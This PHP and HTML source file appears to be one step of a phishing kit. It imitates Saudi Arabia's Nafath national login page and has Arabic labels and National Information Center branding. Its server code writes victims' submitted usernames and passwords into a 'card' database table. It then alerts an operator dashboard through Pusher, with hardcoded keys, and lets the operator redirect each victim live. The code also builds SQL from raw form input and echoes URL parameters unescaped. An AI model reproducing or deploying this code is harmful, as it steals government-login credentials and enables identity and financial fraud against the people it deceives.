<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'معلومات حساب نفاذ');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' =>  'معلومات حساب نفاذ'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}

if (isset($_POST['submit_LogInToTheSystem'])) {
    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );
    //print_r($_POST);
    $UserName = $_POST['UserName'];
    $UserPasswore = $_POST['UserPasswore'];

    include("DB_CON.php");

    $X = 0;
    $q = "UPDATE card SET UserName_Nafad='$UserName',UserPasswore_Nafad='$UserPasswore',CheckTheInfo_Nafad='$X' WHERE id=" . $_SESSION['card_id'] . ";";

    $v = mysqli_query($con, $q);

    if ($v) {
        mysqli_close($con);
        $site = array(
            'message' => 'معلومات حساب نفاذ',
            'type' => '3'
        );
        $userId = $_SESSION['user_id'];

        $User->UpdateStatus($userId,  'معلومات حساب نفاذ');

        $data = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('temaeen-new', 'update-user-accountt', $data);
        echo "<script>document.location.href='wait-nafath.php';</script>";
    }
}
?>



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NAFAD</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;500&display=swap" rel="stylesheet">
    <style>
        nav {
            overflow: auto;
        }

        .nafad {
            margin-right: 222px;
            float: right;
        }

        a {
            text-decoration: none;
        }

        .ff ul {
            list-style-type: none;
        }

        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }

        @media only screen and (max-width: 600px) {
            nav {
                overflow: hidden;
            }

            .nafad {
                float: none;
                margin-left: 230px;
            }
        }

        input {
            height: 37px !important;
            text-align: end;
            border-color: rgb(200, 224, 254) !important;
        }

        input:hover {
            background-color: lightgray;
        }

        ::-webkit-input-placeholder {
            text-align: right;
        }

        .tawtheg {
            transition: all 0.4s ease-in-out;
        }

        .tawtheg:hover {
            background-color: rgb(3, 71, 3) !important;
        }

        .aa {
            transition: all 0.2s ease-in;
            border: 1px solid black !important;
        }

        .aa:hover {
            color: gray;
        }
    </style>

</head>

<body class="bg-light" style="font-family:'Tajawal', sans-serif; overflow-x: hidden;">

    <header class="shadow-sm" style=" background-color: white;">
        <nav>
            <img src="./assets/nafad.png" class="nafad my-4" />
        </nav>
    </header>

    <main>
        <div class="container-fluid bg-light" style="margin-bottom: 100px;">
            <div class="row">
                <div class="col-sm-12 text-center">
                    <h1 class="text-center mt-5" style="font-weight:900; color: #11998E;">الدخول على النظام</h1>
                    <!-- <img src="./assets/openSystem.png" class="mt-4 img-fluid"><br> -->
                </div>
            </div>

            <div class="row d-flex justify-content-center mt-5">
                <div class="col-sm-6 col-lg-4" style="background-color: white; padding:20px 35px;">




                    <form method="POST" action="StepFourth.php?id=<?php echo $_GET['id']; ?>">
                        <label for="user" class="form-label float-end mt-5 fw-bold">اسم المستخدم</label>
                        <input type="text" required name="UserName" id="user" class="form-control" placeholder="اسم المستخدم">
                        <span style="color:red;margin-left: 60%;"><b><?php if (isset($_GET['errorCode'])) {
                                                                            echo "اسم المستخدم غير صحيح";
                                                                        } ?></b></span>
                        <label for="pass" class="form-label float-end mt-4 fw-bold">كلمة المرور</label>
                        <input type="password" required name="UserPasswore" id="pass" class="form-control mb-2" placeholder="كلمة المرور">
                        <span style="color:red;margin-left: 65%;"><b><?php if (isset($_GET['errorCode'])) {
                                                                            echo "كلمة المرور غير صحيحة";
                                                                        } ?></b></span>
                        <br>
                        <button type="submit" name="submit_LogInToTheSystem" class="tawtheg w-100 text-center btn fw-bold mt-4" style="background-color:#11998E; color: white; letter-spacing: 1px; height: 45px !important;">تسجيل الدخول <img src="./assets/130924.png"></button>
                    </form>





                    <div class="mt-4 d-flex flex-column gap-2">
                        <a class="btn aa" href="StepOne.php?id=<?php echo $_GET['id']; ?>">البدء من جديد </a>
                        <button class="btn float-end aa"> إعادة تعيين / تغيير كلمة المرور<i class="bi bi-lock"></i></button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="container rounded" style="background-color: #dddddd; overflow: hidden;">
            <div class="row d-flex align-items-center pt-3">

                <div class="col-sm-3 col-lg-3 mt-4">
                    <p class="fw-bold text-end">تطوير وتشغيل</p>
                    <h2 class="fw-bold text-end">مركز المعلومات الوطني</h2>
                    <p class="fw-bold text-end">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
                </div>
                <div class="col-sm-3 col-lg-3 text-center">
                    <img src="./assets/NIC.png">
                </div>
            </div>
        </div>
    </footer>
<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
</body>

</html>